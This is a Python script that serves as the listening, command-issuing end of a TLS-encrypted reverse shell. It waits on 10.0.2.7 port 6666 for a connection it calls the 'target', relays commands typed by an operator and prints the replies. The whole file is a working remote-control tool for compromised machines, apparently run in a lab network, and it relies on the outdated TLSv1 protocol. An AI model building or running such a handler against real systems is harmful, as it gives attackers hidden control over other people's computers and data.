#!/usr/bin/env python

import socket
import ssl

HOST = "10.0.2.7"
PORT = 6666

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    wrapS = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, server_side=True,
    keyfile="/home/caius/key_and_cert_files/key.pem", certfile="/home/caius/key_and_cert_files/cert.pem")
    wrapS.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    wrapS.bind((HOST, PORT))
    wrapS.listen()
    print("[+] Listening for connections")
    conn, addr = wrapS.accept()
    print("[+] Connection established with target ", addr)
    while True:
        command = input(">> ")
        conn.send(command.encode())
        data = conn.recv(1024)
        print(data.decode("utf-8", "ignore"))
